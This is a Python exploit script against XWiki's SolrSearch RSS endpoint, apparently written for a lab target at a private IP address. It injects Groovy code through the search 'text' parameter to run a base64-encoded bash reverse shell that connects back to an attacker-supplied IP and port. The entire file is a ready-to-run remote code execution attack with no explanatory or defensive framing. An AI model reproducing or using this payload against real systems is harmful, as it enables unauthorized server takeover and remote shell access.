import requests
import urllib.parse
import base64

def send_request(url):
    print("\n[+] Sending exploit request...\n")
    try:
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            print("[+] Exploit sent successfully! Check your listener.")
        else:
            print(f"[-] Exploit may have failed. Status code: {r.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Request error: {e}")

def main():
    target = "http://10.10.11.80:8080"
    ip = "{ip}"
    port = "{port}"

    revshell = f"bash -c 'sh -i >& /dev/tcp/{ip}/{port} 0>&1'"
    b64_revshell = base64.b64encode(revshell.encode()).decode()

    payload = (
        "}}}}{{async async=false}}{{groovy}}"
        f"\"bash -c {{echo,{b64_revshell}}}|{{base64,-d}}|{{bash,-i}}\".execute()"
        "{{/groovy}}{{/async}}"
    )

    encoded_payload = urllib.parse.quote(payload, safe='=,-')

    exploit_url = f"{target}/xwiki/bin/get/Main/SolrSearch?media=rss&text={encoded_payload}"

    print("\n[+] Exploit URL:\n" + exploit_url)

    send_request(exploit_url)

    print(f"\n[+] Done. Awaiting shell on {ip}:{port}")

if __name__ == "__main__":
    main()
